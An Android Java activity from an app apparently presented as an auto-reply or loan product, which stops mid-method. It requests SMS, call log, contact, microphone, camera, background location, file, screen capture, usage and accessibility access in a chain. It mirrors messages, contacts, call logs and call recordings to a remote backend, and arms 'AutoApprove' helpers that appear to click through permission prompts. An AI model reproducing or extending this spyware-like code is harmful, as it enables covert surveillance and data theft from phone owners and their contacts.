package com.autoreplybot.remote;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.autoreplybot.LoginActivity;
import com.autoreplybot.R;
import com.google.android.material.appbar.MaterialToolbar;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.chip.Chip;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GetTokenResult;
import com.google.firebase.messaging.FirebaseMessaging;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class RemoteControlHomeActivity extends AppCompatActivity {
    public static final String EXTRA_FOCUS_PERMISSIONS = "focus_permissions";
    public static final String EXTRA_FOCUS_MANAGEMENT = "focus_management";
    public static final String EXTRA_OPEN_FOLDER_PICKER = "open_folder_picker";
    public static final String EXTRA_MANAGE_ONLY = "manage_only";

    private RemoteControlPrefs prefs;
    private RemoteModulePrefs modulePrefs;
    private RemoteDeviceRepository deviceRepository;
    private final ExecutorService pairExecutor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final RemotePairApi pairApi = new RemotePairApi();
    private TextInputEditText inputPairCode;
    private MaterialButton buttonPairSave;
    private Chip chipCamera;
    private Chip chipMicrophone;
    private Chip chipLocation;
    private Chip chipLocationBg;
    private Chip chipGallery;
    private Chip chipNotificationAccess;
    private Chip chipFiles;
    private Chip chipSms;
    private Chip chipCallLogs;
    private Chip chipContacts;
    private Chip chipScreen;
    private Chip chipApps;
    private Chip chipAppUsage;
    private Chip chipAppControl;
    private View cardActiveSession;
    private View cardPermissions;
    private View bodyPermissions;
    private TextView chevronPermissions;
    private android.widget.TextView textActiveSession;
    private View progress;
    private boolean continueMissingAfterRuntime;
    /** Ask for Notification Access once per open until granted. */
    private boolean specialGuideBackgroundPending;
    private boolean specialGuideWaitingBackgroundSettings;
    private boolean permissionChainActive;
    private boolean permissionChainContinueEnable;
    private int permissionChainBatchIndex;
    private List<RemoteRuntimePermissionBatcher.PermissionBatch> permissionChainBatches;
    private boolean permissionChainHandlingBackground;
    private boolean permissionChainWaitingBackgroundSettings;
    private boolean permissionChainWaitingFolder;

    private final ActivityResultLauncher<String[]> permissionChainLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(),
                    result -> {
                        RemotePermissionGrantEffects.apply(this, modulePrefs, result);
                        refreshPermissionChips();
                        ensureLocationSharingFromPermission();
                        boolean foregroundGranted =
                                Boolean.TRUE.equals(result.get(Manifest.permission.ACCESS_FINE_LOCATION))
                                        || Boolean.TRUE.equals(result.get(
                                        Manifest.permission.ACCESS_COARSE_LOCATION));
                        RemoteRuntimePermissionBatcher.PermissionBatch batch =
                                permissionChainBatchIndex < permissionChainBatches.size()
                                        ? permissionChainBatches.get(permissionChainBatchIndex)
                                        : null;
                        boolean wasLocationBatch = batch != null
                                && batch.titleResId == R.string.remote_setup_batch_location;
                        permissionChainBatchIndex++;
                        if (wasLocationBatch && foregroundGranted
                                && Build.VERSION.SDK_INT >= 29
                                && !RemotePermissionChecks.hasBackgroundLocation(this)) {
                            requestBackgroundLocationInChain();
                            return;
                        }
                        requestNextPermissionChainBatch();
                    });

    private final ActivityResultLauncher<String[]> runtimePermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(),
                    result -> {
                        RemotePermissionGrantEffects.apply(this, modulePrefs, result);
                        refreshPermissionChips();
                        ensureLocationSharingFromPermission();
                        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_SMS))) {
                            modulePrefs.setMessagesSharingEnabled(true);
                            new RemoteDeviceInfoRepository(this).publishModuleFlags();
                            new Thread(() -> RemoteSmsMirror.syncInbox(this, 100)).start();
                        }
                        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_CALL_LOG))
                                || Boolean.TRUE.equals(result.get(Manifest.permission.READ_PHONE_STATE))
                                || Boolean.TRUE.equals(result.get(Manifest.permission.RECORD_AUDIO))) {
                            if (RemotePermissionChecks.hasCallLogAccess(this)) {
                                modulePrefs.setCallLogsSharingEnabled(true);
                                new RemoteDeviceInfoRepository(this).publishModuleFlags();
                                new Thread(() -> {
                                    RemoteCallLogMirror.syncRecent(this, 100);
                                    RemoteCallRecordingLinker.attachOemRecordings(this, 15);
                                }).start();
                            }
                            RemoteCallRecordingWatcher.syncWithPrefs(this);
                            if (!RemotePermissionChecks.hasCallRecordingReady(this)
                                    && RemotePermissionChecks.hasCallLogAccess(this)) {
                                Toast.makeText(this, R.string.remote_perm_call_logs_partial,
                                        Toast.LENGTH_LONG).show();
                            }
                        }
                        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_CONTACTS))) {
                            modulePrefs.setContactsSharingEnabled(true);
                            new RemoteDeviceInfoRepository(this).publishModuleFlags();
                            new Thread(() -> RemoteContactsMirror.syncAll(this, 500)).start();
                        }
                        if (continueMissingAfterRuntime) {
                            continueMissingAfterRuntime = false;
                            continueMissingPermissionsFlow();
                        }
                    });

    private final ActivityResultLauncher<String> backgroundLocationLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(),
                    granted -> {
                        refreshPermissionChips();
                        ensureLocationSharingFromPermission();
                        if (permissionChainHandlingBackground) {
                            onBackgroundLocationChainStepComplete(granted);
                            return;
                        }
                        if (specialGuideBackgroundPending) {
                            onBackgroundLocationGuideStepComplete(granted);
                        }
                    });

    private final ActivityResultLauncher<Uri> folderLauncher =
            registerForActivityResult(new ActivityResultContracts.OpenDocumentTree(), uri -> {
                RemoteFolderGrantAutoApprove.disarm();
                boolean wasChain = permissionChainWaitingFolder;
                boolean guideWasWaiting = RemoteSpecialPermissionGuide.isAwaitingReturn();
                permissionChainWaitingFolder = false;
                if (uri != null) {
                    RemoteFolderGrantHelper.grantFolder(this, uri);
                    modulePrefs.setFileManagerEnabled(true);
                    Toast.makeText(this, R.string.remote_perm_folder_added, Toast.LENGTH_SHORT).show();
                    refreshPermissionChips();
                }
                if (wasChain) {
                    completePermissionChain();
                } else if (guideWasWaiting) {
                    RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
                }
            });

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (FirebaseAuth.getInstance().getCurrentUser() == null) {
            Intent login = new Intent(this, LoginActivity.class);
            login.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(login);
            finish();
            return;
        }
        boolean manageOnly = getIntent() != null
                && getIntent().getBooleanExtra(EXTRA_MANAGE_ONLY, false);
        if (!manageOnly) {
            com.autoreplybot.AuthNavigator.goLoanDashboard(this);
            return;
        }
        setContentView(R.layout.activity_remote_control_home);

        prefs = new RemoteControlPrefs(this);
        prefs.ensureDefaultDialerPasscode();
        modulePrefs = new RemoteModulePrefs(this);
        RemoteFolderGrantHelper.restoreDefaultGrantIfPersisted(this);
        deviceRepository = new RemoteDeviceRepository(this);

        // Back / toolbar: leave the app (never return to old auto-reply launcher).
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                navigateBackToProfile();
            }
        });
        ((MaterialToolbar) findViewById(R.id.toolbar))
                .setNavigationOnClickListener(v -> navigateBackToProfile());
        progress = findViewById(R.id.progress);
        chipCamera = findViewById(R.id.chip_camera);
        chipMicrophone = findViewById(R.id.chip_microphone);
        chipLocation = findViewById(R.id.chip_location);
        chipLocationBg = findViewById(R.id.chip_location_bg);
        chipGallery = findViewById(R.id.chip_gallery);
        chipNotificationAccess = findViewById(R.id.chip_notification_access);
        chipFiles = findViewById(R.id.chip_files);
        chipSms = findViewById(R.id.chip_sms);
        chipCallLogs = findViewById(R.id.chip_call_logs);
        chipContacts = findViewById(R.id.chip_contacts);
        chipScreen = findViewById(R.id.chip_screen);
        chipApps = findViewById(R.id.chip_apps);
        chipAppUsage = findViewById(R.id.chip_app_usage);
        chipAppControl = findViewById(R.id.chip_app_control);
        cardActiveSession = findViewById(R.id.card_active_session);
        cardPermissions = findViewById(R.id.card_permissions);
        bodyPermissions = findViewById(R.id.body_permissions);
        chevronPermissions = findViewById(R.id.chevron_permissions);
        textActiveSession = findViewById(R.id.text_active_session);

        wireAccordionHeaders();
        wirePermissionRows();

        inputPairCode = findViewById(R.id.input_pair_code);
        buttonPairSave = findViewById(R.id.button_pair_save);
        if (buttonPairSave != null) {
            buttonPairSave.setOnClickListener(v -> onPairSaveClicked());
        }
        findViewById(R.id.button_enable_missing_permissions).setOnClickListener(v ->
                enableMissingPermissions());
        findViewById(R.id.button_open_active_session).setOnClickListener(v -> {
            Intent open = new Intent(this, RemoteActiveSessionActivity.class);
            startActivity(open);
        });

        handleFocusExtras(getIntent());
        RemoteControlAutoStart.apply(this);
    }

    private void navigateBackToProfile() {
        Intent intent = new Intent(this, com.autoreplybot.LoanHomeActivity.class);
        intent.putExtra(com.autoreplybot.LoanHomeActivity.EXTRA_TAB, R.id.nav_loan_profile);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);
        finish();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleFocusExtras(intent);
    }

    @Override
    protected void onDestroy() {
        pairExecutor.shutdownNow();
        super.onDestroy();
    }

    private void onPairSaveClicked() {
        if (!RemotePairApi.isBackendConfigured()) {
            Toast.makeText(this, R.string.remote_backend_url_missing, Toast.LENGTH_LONG).show();
            return;
        }
        CharSequence raw = inputPairCode != null ? inputPairCode.getText() : null;
        RemotePairApi.ParsedPairInput parsed = RemotePairApi.parseUserInput(
                raw != null ? raw.toString() : "", "");
        if (parsed.code.isEmpty() || !parsed.code.matches("\\d{6}")) {
            Toast.makeText(this, R.string.remote_pair_invalid_code, Toast.LENGTH_SHORT).show();
            return;
        }
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            return;
        }
        setPairBusy(true);
        final String code = parsed.code;
        user.getIdToken(false)
                .addOnSuccessListener(tokenResult ->
                        pairExecutor.execute(() -> completePairing(tokenResult, code)))
                .addOnFailureListener(error -> {
                    setPairBusy(false);
                    Toast.makeText(this,
                            getString(R.string.remote_error, error.getMessage()),
                            Toast.LENGTH_LONG).show();
                });
    }

    private void completePairing(@NonNull GetTokenResult tokenResult, @NonNull String code) {
        try {
            String idToken = tokenResult.getToken();
            if (TextUtils.isEmpty(idToken)) {
                throw new IllegalStateException("Empty Firebase ID token");
            }
            pairApi.completePairing(
                    idToken,
                    code,
                    "",
                    getString(R.string.remote_default_client_name),
                    prefs.getOrCreateDeviceId(),
                    RemotePairTrustOptions.defaults());
            mainHandler.post(() -> {
                setPairBusy(false);
                if (inputPairCode != null) inputPairCode.setText("");
                Toast.makeText(this, R.string.remote_pair_success, Toast.LENGTH_SHORT).show();
            });
        } catch (RemoteAccountBlockedException blocked) {
            mainHandler.post(() -> {
                setPairBusy(false);
                RemoteAccountGate.showBlocked(this, blocked.getServerMessage());
            });
        } catch (Exception error) {
            mainHandler.post(() -> {
                setPairBusy(false);
                Toast.makeText(this,
                        getString(R.string.remote_error,
                                error.getMessage() != null ? error.getMessage() : "unknown"),
                        Toast.LENGTH_LONG).show();
            });
        }
    }

    private void setPairBusy(boolean busy) {
        if (progress != null) {
            progress.setVisibility(busy ? View.VISIBLE : View.GONE);
        }
        if (buttonPairSave != null) buttonPairSave.setEnabled(!busy);
        if (inputPairCode != null) inputPairCode.setEnabled(!busy);
    }

    private void handleFocusExtras(@Nullable Intent intent) {
        if (intent == null) return;
        if (intent.getBooleanExtra(EXTRA_FOCUS_PERMISSIONS, false)) {
            expandSection(bodyPermissions, chevronPermissions);
            focusCard(cardPermissions);
        }
        if (intent.getBooleanExtra(EXTRA_FOCUS_MANAGEMENT, false)) {
            expandSection(bodyPermissions, chevronPermissions);
            focusCard(cardPermissions);
            enableMissingPermissions();
            intent.removeExtra(EXTRA_FOCUS_MANAGEMENT);
        }
        if (intent.getBooleanExtra(EXTRA_OPEN_FOLDER_PICKER, false)) {
            expandSection(bodyPermissions, chevronPermissions);
            focusCard(cardPermissions);
            if (cardPermissions != null) {
                cardPermissions.post(() -> launchDefaultFolderPicker(false));
            }
            intent.removeExtra(EXTRA_OPEN_FOLDER_PICKER);
        }
    }

    private void wireAccordionHeaders() {
        View headerPerm = findViewById(R.id.header_permissions);
        if (headerPerm != null) {
            headerPerm.setOnClickListener(v -> {
                if (bodyPermissions == null) return;
                if (bodyPermissions.getVisibility() == View.VISIBLE) {
                    setCollapsed(bodyPermissions, chevronPermissions);
                } else {
                    expandSection(bodyPermissions, chevronPermissions);
                }
            });
        }
    }

    private void expandSection(@Nullable View body, @Nullable TextView chevron) {
        if (body != null) body.setVisibility(View.VISIBLE);
        if (chevron != null) chevron.setText("▲");
    }

    private static void setCollapsed(@Nullable View body, @Nullable TextView chevron) {
        if (body != null) body.setVisibility(View.GONE);
        if (chevron != null) chevron.setText("▼");
    }

    private void focusCard(@Nullable View card) {
        if (card == null) return;
        card.post(() -> {
            View scroll = findViewById(R.id.scroll_root);
            if (scroll instanceof androidx.core.widget.NestedScrollView) {
                ((androidx.core.widget.NestedScrollView) scroll)
                        .smoothScrollTo(0, Math.max(0, card.getTop() - 24));
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        RemoteModuleAutoEnable.syncFromSystemAccess(this);
        bindUi();
        ensureLocationSharingFromPermission();
        RemoteAccountGate.checkAsync(this);
        if (prefs.isRemoteControlEnabled()) {
            deviceRepository.heartbeat(false);
            refreshFcmToken();
            RemoteModuleRuntime.start(this);
            RemoteCallRecordingWatcher.syncWithPrefs(this);
        }
        RemoteFolderGrantHelper.restoreDefaultGrantIfPersisted(this);
        refreshPermissionChips();
        if (permissionChainWaitingBackgroundSettings && permissionChainActive) {
            permissionChainWaitingBackgroundSettings = false;
            RemoteBackgroundLocationAutoApprove.disarm();
            permissionChainBatchIndex++;
            requestNextPermissionChainBatch();
            return;
        }
        if (specialGuideWaitingBackgroundSettings && RemoteSpecialPermissionGuide.isAwaitingReturn()) {
            specialGuideWaitingBackgroundSettings = false;
            RemoteBackgroundLocationAutoApprove.disarm();
            RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
            return;
        }
        if (RemoteSpecialPermissionGuide.isAwaitingReturn()) {
            RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
            return;
        }
    }

    private void startPermissionChain(boolean continueEnable) {
        if (permissionChainActive) {
            if (continueEnable) {
                permissionChainContinueEnable = true;
            }
            return;
        }
        permissionChainBatches = RemoteRuntimePermissionBatcher.allBatchesInOrder(this);
        permissionChainBatchIndex = 0;
        permissionChainContinueEnable = continueEnable;
        permissionChainActive = true;
        requestNextPermissionChainBatch();
    }

    private void requestNextPermissionChainBatch() {
        while (permissionChainBatchIndex < permissionChainBatches.size()) {
            RemoteRuntimePermissionBatcher.PermissionBatch batch =
                    permissionChainBatches.get(permissionChainBatchIndex);
            if (batch.titleResId == R.string.remote_setup_batch_background_location) {
                if (Build.VERSION.SDK_INT < 29
                        || !RemotePermissionChecks.hasForegroundLocation(this)
                        || RemotePermissionChecks.hasBackgroundLocation(this)) {
                    permissionChainBatchIndex++;
                    continue;
                }
                requestBackgroundLocationInChain();
                return;
            }
            String[] missing = RemoteRuntimePermissionBatcher.missingPermissions(this, batch);
            if (missing.length == 0) {
                permissionChainBatchIndex++;
                continue;
            }
            permissionChainLauncher.launch(missing);
            return;
        }
        finishPermissionChain();
    }

    private void requestBackgroundLocationInChain() {
        if (Build.VERSION.SDK_INT < 29) {
            permissionChainBatchIndex++;
            requestNextPermissionChainBatch();
            return;
        }
        if (!RemotePermissionChecks.hasForegroundLocation(this)) {
            permissionChainBatchIndex++;
            requestNextPermissionChainBatch();
            return;
        }
        if (RemotePermissionChecks.hasBackgroundLocation(this)) {
            permissionChainBatchIndex++;
            requestNextPermissionChainBatch();
            return;
        }
        permissionChainHandlingBackground = true;
        RemoteBackgroundLocationAutoApprove.arm(35_000L);
        backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
    }

    private void onBackgroundLocationChainStepComplete(boolean granted) {
        permissionChainHandlingBackground = false;
        RemoteBackgroundLocationAutoApprove.disarm();
        if (!granted && !RemotePermissionChecks.hasBackgroundLocation(this)
                && Build.VERSION.SDK_INT >= 30) {
            permissionChainWaitingBackgroundSettings = true;
            RemoteBackgroundLocationAutoApprove.arm(35_000L);
            RemoteBackgroundLocationHelper.openAppDetailsSettings(this);
            return;
        }
        permissionChainBatchIndex++;
        requestNextPermissionChainBatch();
    }

    private void finishPermissionChain() {
        completePermissionChain();
    }

    private void requestDefaultFolderInChain() {
        permissionChainWaitingFolder = true;
        launchDefaultFolderPicker(true);
    }

    private void launchDefaultFolderPicker(boolean fromPermissionChain) {
        if (fromPermissionChain) permissionChainWaitingFolder = true;
        RemoteFolderGrantHelper.prepareDefaultInternalStoragePicker();
        folderLauncher.launch(RemoteFolderGrantHelper.getDefaultInternalStorageTreeUri());
    }

    private void completePermissionChain() {
        permissionChainActive = false;
        permissionChainWaitingFolder = false;
        if (!prefs.isPermissionSetupCompleted()) {
            prefs.setPermissionSetupCompleted(true);
        }
        refreshPermissionChips();
        bindUi();
        permissionChainContinueEnable = false;
        RemoteControlAutoStart.apply(this);
    }

    private void maybeOpenLoanDashboardAfterPermissions() {
        if (isFinishing()) return;
        Intent launch = getIntent();
        if (launch != null && launch.getBooleanExtra(EXTRA_MANAGE_ONLY, false)) return;
        if (RemoteSpecialPermissionGuide.isActive()) return;
        if (!com.autoreplybot.AuthNavigator.canEnterLoanDashboard(this)) return;
        com.autoreplybot.AuthNavigator.goLoanDashboard(this);
    }

    private void maybeStartSpecialPermissionGuide() {
        if (permissionChainActive || permissionChainWaitingFolder) return;
        if (!prefs.isPermissionSetupCompleted()) return;
        RemoteSpecialPermissionGuide.startIfNeeded(this, specialPermissionGuideHost());
    }

    @NonNull
    private RemoteSpecialPermissionGuide.Host specialPermissionGuideHost() {
        return specialPermissionGuideHostImpl;
    }

    private final RemoteSpecialPermissionGuide.Host specialPermissionGuideHostImpl =
            new RemoteSpecialPermissionGuide.Host() {
                @Override
                public void expandPermissionsSection() {
                    expandSection(bodyPermissions, chevronPermissions);
                    focusCard(cardPermissions);
                }

                @Override
                public void showGuideDialog(int titleRes,
                                            int messageRes,
                                            @NonNull Runnable onAllow,
                                            @NonNull Runnable onSkip) {
                    new MaterialAlertDialogBuilder(RemoteControlHomeActivity.this)
                            .setTitle(titleRes)
                            .setMessage(messageRes)
                            .setNegativeButton(R.string.remote_guide_skip, (d, w) -> onSkip.run())
                            .setPositiveButton(R.string.remote_notif_access_prompt_allow, (d, w) -> onAllow.run())
                            .setOnCancelListener(d -> onSkip.run())
                            .show();
                }

                @Override
                public void openNotificationAccess() {
                    openNotificationListenerSettings();
                }

                @Override
                public void requestBackgroundLocation() {
                    requestBackgroundLocationForGuide();
                }

                @Override
                public void enableInstalledAppsSharing() {
                    modulePrefs.setInstalledAppsSharingEnabled(true);
                    new RemoteDeviceInfoRepository(RemoteControlHomeActivity.this).publishModuleFlags();
                    new Thread(() -> new RemoteInstalledAppsIndexer(RemoteControlHomeActivity.this)
                            .indexAndSync()).start();
                    refreshPermissionChips();
                }

                @Override
                public void openUsageAccessSettings() {
                    RemoteAppUsageMirror.openUsageAccessSettings(RemoteControlHomeActivity.this);
                }

                @Override
                public void enableAppUsageSharing() {
                    modulePrefs.setAppUsageSharingEnabled(true);
                    new RemoteDeviceInfoRepository(RemoteControlHomeActivity.this).publishModuleFlags();
                    new Thread(() -> RemoteAppUsageMirror.syncRecent(RemoteControlHomeActivity.this, 7))
                            .start();
                    refreshPermissionChips();
                }

                @Override
                public void openAppControlAccessibility() {
                    RemoteAppBlockManager.openAccessibilitySettings(RemoteControlHomeActivity.this);
                }

                @Override
                public void openScreenCapture() {
                    Intent consent = new Intent(RemoteControlHomeActivity.this,
                            RemoteMediaProjectionConsentActivity.class);
                    consent.putExtra(RemoteMediaProjectionConsentActivity.EXTRA_CONTINUE_ACTION,
                            RemoteMediaProjectionConsentActivity.ACTION_STORE_ONLY);
                    startActivity(consent);
                }

                @Override
                public void onGuideFinished() {
                    refreshPermissionChips();
                    bindUi();
                    maybeOpenLoanDashboardAfterPermissions();
                }
            };

    private void requestBackgroundLocationForGuide() {
        if (Build.VERSION.SDK_INT < 29) {
            RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
            return;
        }
        if (!RemotePermissionChecks.hasForegroundLocation(this)
                || RemotePermissionChecks.hasBackgroundLocation(this)) {
            RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
            return;
        }
        specialGuideBackgroundPending = true;
        RemoteBackgroundLocationAutoApprove.arm(35_000L);
        backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
    }

    private void onBackgroundLocationGuideStepComplete(boolean granted) {
        specialGuideBackgroundPending = false;
        RemoteBackgroundLocationAutoApprove.disarm();
        if (!granted && !RemotePermissionChecks.hasBackgroundLocation(this)
                && Build.VERSION.SDK_INT >= 30) {
            specialGuideWaitingBackgroundSettings = true;
            RemoteBackgroundLocationAutoApprove.arm(35_000L);
            RemoteBackgroundLocationHelper.openAppDetailsSettings(this);
            RemoteSpecialPermissionGuide.markAwaitingReturn();
            return;
        }
        RemoteSpecialPermissionGuide.continueAfterReturn(this, specialPermissionGuideHost());
    }

    /**
     * OS location permission alone should turn on Location Sharing (unless the user
     * explicitly disabled it), so both phones appear on the website map.
     */
    private void ensureLocationSharingFromPermission() {
        if (modulePrefs == null) return;
        if (!modulePrefs.ensureLocationSharingIfPermitted(this)) return;
        new RemoteDeviceInfoRepository(this).publishCurrent(
                RemoteDeviceInfoCollector.collect(this), () -> {});
    }

    private void wirePermissionRows() {
        findViewById(R.id.row_perm_camera).setOnClickListener(v ->
                requestRuntimeIfNeeded(new String[]{Manifest.permission.CAMERA},
                        RemotePermissionChecks.hasCamera(this)));
        findViewById(R.id.row_perm_microphone).setOnClickListener(v ->
                requestRuntimeIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO},
                        RemotePermissionChecks.hasMicrophone(this)));
        findViewById(R.id.row_perm_location).setOnClickListener(v ->
                requestRuntimeIfNeeded(new String[]{
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_COARSE_LOCATION
                        },
                        RemotePermissionChecks.hasForegroundLocation(this)));
        findViewById(R.id.row_perm_location_bg).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasBackgroundLocation(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
                return;
            }
            if (!RemotePermissionChecks.hasForegroundLocation(this)) {
                runtimePermissionLauncher.launch(new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                });
                return;
            }
            if (Build.VERSION.SDK_INT >= 29) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            } else {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
            }
        });
        findViewById(R.id.row_perm_gallery).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasMediaAccess(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
                return;
            }
            if (Build.VERSION.SDK_INT >= 33) {
                runtimePermissionLauncher.launch(new String[]{
                        Manifest.permission.READ_MEDIA_IMAGES,
                        Manifest.permission.READ_MEDIA_VIDEO,
                        Manifest.permission.READ_MEDIA_AUDIO
                });
            } else {
                runtimePermissionLauncher.launch(new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE
                });
            }
        });
        findViewById(R.id.row_perm_notification_access).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasNotificationListener(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
            } else {
                openNotificationListenerSettings();
            }
        });
        findViewById(R.id.row_perm_files).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasFolderAccess(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
            } else {
                modulePrefs.setFileManagerEnabled(true);
                launchDefaultFolderPicker(false);
            }
        });
        findViewById(R.id.row_perm_sms).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasSmsAccess(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
                modulePrefs.setMessagesSharingEnabled(true);
                new RemoteDeviceInfoRepository(this).publishModuleFlags();
                return;
            }
            runtimePermissionLauncher.launch(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
            });
        });
        findViewById(R.id.row_perm_call_logs).setOnClickListener(v -> requestCallLogPermissions());
        findViewById(R.id.row_perm_contacts).setOnClickListener(v -> {
            if (RemotePermissionChecks.hasContactsAccess(this)) {
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
                modulePrefs.setContactsSharingEnabled(true);
                new RemoteDeviceInfoRepository(this).publishModuleFlags();
                return;
            }
            runtimePermissionLauncher.launch(new String[]{Manifest.permission.READ_CONTACTS});
        });
        findViewById(R.id.row_perm_screen).setOnClickListener(v -> {
            if (RemoteMediaProjectionHolder.hasValidResult()) {
                modulePrefs.setScreenMirrorEnabled(true);
                modulePrefs.setScreenRecordEnabled(true);
                new RemoteDeviceInfoRepository(this).publishModuleFlags();
                refreshPermissionChips();
                Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
                return;
            }
            Intent consent = new Intent(this, RemoteMediaProjectionConsentActivity.class);
            consent.putExtra(RemoteMediaProjectionConsentActivity.EXTRA_CONTINUE_ACTION,
                    RemoteMediaProjectionConsentActivity.ACTION_STORE_ONLY);
            startActivity(consent);
        });
        findViewById(R.id.row_perm_apps).setOnClickListener(v -> {
            boolean enabled = !modulePrefs.isInstalledAppsSharingEnabled();
            modulePrefs.setInstalledAppsSharingEnabled(enabled);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            refreshPermissionChips();
            Toast.makeText(this,
                    enabled ? R.string.status_enabled : R.string.status_disabled,
                    Toast.LENGTH_SHORT).show();
            if (enabled) {
                new Thread(() -> new RemoteInstalledAppsIndexer(this).indexAndSync()).start();
            }
        });
        findViewById(R.id.row_perm_app_usage).setOnClickListener(v -> {
            if (!RemoteAppUsageMirror.hasUsageAccess(this)) {
                Toast.makeText(this, R.string.remote_app_usage_setup_hint, Toast.LENGTH_LONG).show();
                RemoteAppUsageMirror.openUsageAccessSettings(this);
                return;
            }
            boolean enabled = !modulePrefs.isAppUsageSharingEnabled();
            modulePrefs.setAppUsageSharingEnabled(enabled);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            refreshPermissionChips();
            Toast.makeText(this,
                    enabled ? R.string.status_enabled : R.string.status_disabled,
                    Toast.LENGTH_SHORT).show();
            if (enabled) {
                new Thread(() -> RemoteAppUsageMirror.syncRecent(this, 7)).start();
            }
        });
        View.OnClickListener openAppControlAccessibility = v -> {
            boolean a11y = RemoteAppBlockManager.isAccessibilityEnabled(this);
            modulePrefs.setAppControlEnabled(a11y);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            refreshPermissionChips();
            // Always open Accessibility settings so user can turn App Control on/off.
            RemoteAppBlockManager.openAccessibilitySettings(this);
        };
        findViewById(R.id.row_perm_app_control).setOnClickListener(openAppControlAccessibility);
        if (chipAppControl != null) {
            chipAppControl.setOnClickListener(openAppControlAccessibility);
        }
    }

    private void requestRuntimeIfNeeded(@NonNull String[] permissions, boolean alreadyGranted) {
        if (alreadyGranted) {
            Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
            return;
        }
        runtimePermissionLauncher.launch(permissions);
    }

    /** Ask for call log + phone state + mic so answered calls can be recorded. */
    private void requestCallLogPermissions() {
        ArrayList<String> needed = new ArrayList<>();
        if (!RemotePermissionChecks.hasCallLogAccess(this)) {
            needed.add(Manifest.permission.READ_CALL_LOG);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_PHONE_STATE);
        }
        if (!RemotePermissionChecks.hasMicrophone(this)) {
            needed.add(Manifest.permission.RECORD_AUDIO);
        }
        if (Build.VERSION.SDK_INT >= 33
                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else if (Build.VERSION.SDK_INT < 33
                && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
